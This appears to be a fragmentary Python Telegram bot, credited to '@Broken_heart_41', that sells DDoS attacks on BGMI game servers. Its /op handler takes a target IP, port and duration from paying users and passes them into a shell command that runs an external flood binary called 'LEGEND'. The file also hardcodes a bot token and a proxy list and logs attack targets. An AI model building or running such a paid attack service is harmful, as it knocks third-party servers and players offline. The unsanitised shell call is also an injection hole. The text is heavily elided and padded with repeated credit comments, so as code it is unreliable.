...
# @Broken_heart_41 GRP#bgmiddoserpython
...
# @Broken_heart_41 GRPTg #from keep_alive import keep_alive
# @Broken_heart_41 GRP #keep_alive()
# @Broken_heart_41 GRP# insert your Telegram bot token here

    
bot = telebot.TeleBot('7929623129:AAGnzzZxQTtqpyRPOvyhj9ItoqnsU_NaV1k')

# @Broken_heart_41 GRP # Admin user IDs
admin_id = ["7636706065"]

# @Broken_heart_41 GRP # File to store allowed user IDs
USER_FILE = "users.txt"

# @Broken_heart_41 GRP # File to store command logs
LOG_FILE = "log.txt"


# @Broken_heart_41 GRP # List of proxy addresses
PROXIES = [
...
"https://162.223.94.164:80",#script by @Broken_heart_41 🚩
...
"https://50.168.163.182:80",#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
...
"https://3.12.144.146:3128",#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
...
"https://50.174.7.157:80",#script by Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
...
"https://12.186.205.122:80",#script by Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
...
"https://50.239.72.18:80",#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
...
"https://134.73.65.97:6649"
    # Broken_heart_41 GRP # Add more proxy addresses as needed
]
...
# Broken_heart_41 GRP# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # @Broken_heart_41 GRP # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
...
# @Broken_heart_41 GRP # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # @Broken_heart_41 GRP # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# @Broken_heart_41 GRP # Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = ". No data found ."#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
...
# @Broken_heart_41 GRP # Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
...
def add_user(message):
    ...
    if user_id in admin_id:
        command = message.text.split()#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
#script by @Broken_heart_41 🚩
...
# @Broken_heart_41 GRP # Function to handle the reply when free users run the /bgmi command
...
# @Broken_heart_41 GRP # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
...
# @Broken_heart_41 GRP # Handler for /bgmi command
@bot.message_handler(commands=['op'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # @Broken_heart_41 GRP # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # @Broken_heart_41 GRP # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "🦋⁂༄𝙲𝙤𝙤𝕝𝒅𝒐ฬ𝒏༄⁂🦋"
                bot.reply_to(message, response)
                return
            # @Broken_heart_41 GRP # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # @Broken_heart_41 GRP # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # @Broken_heart_41 GRP # Convert time to integer
            time = int(command[3])  # @Broken_heart_41 GRP # Convert port to integer
            if time > 180:
                response = "𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗲𝗻𝘁𝗲𝗿𝗲𝗱 18𝟬 𝘀𝗲𝗰"
            else:
                record_command_logs(user_id, '/op', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # @Broken_heart_41 GRP # Call start_attack_reply function
                full_command = f"./LEGEND {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n_DANGER_PAID_DDOS"
        else:
            response = "𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝘼𝙏𝙏𝘼𝘾𝙆\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝟮.𝟯𝟰.𝟱𝟲.𝟱𝟲 𝟮𝟯𝟰𝟱𝟲 18𝟬\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲\n\n_DANGER_PAID_DDOS"  # @Broken_heart_41 GRP # Updated command syntax
    else:
        response = "🚫 𝗠𝗲𝘁𝗵𝗼𝗱  𝗹𝗶𝗸𝗲 𝗲𝗮𝘀𝘆 𝗯𝘂𝘁 𝘆𝗼𝘂 𝗮𝗿𝗲 🚫𝗻𝗼𝘁 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝘁𝗵𝗶𝘀 𝘄𝗼𝗿𝗱 𝗜 𝗰𝗮𝗻'𝘁 𝗵𝗲𝗹𝗽 𝘁𝗼 𝘂𝘀𝗲\n𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖𝙛𝙩𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙬𝙤𝙧𝙙 /op \n𝙘𝙤𝙣𝙩𝙖𝙘𝙩 :- @Broken_heart_41\n\n_DANGER_PAID_DDOS"

    bot.reply_to(message, response)



# @Broken_heart_41 GRP # Add /mylogs command to display logs recorded for bgmi and website commands
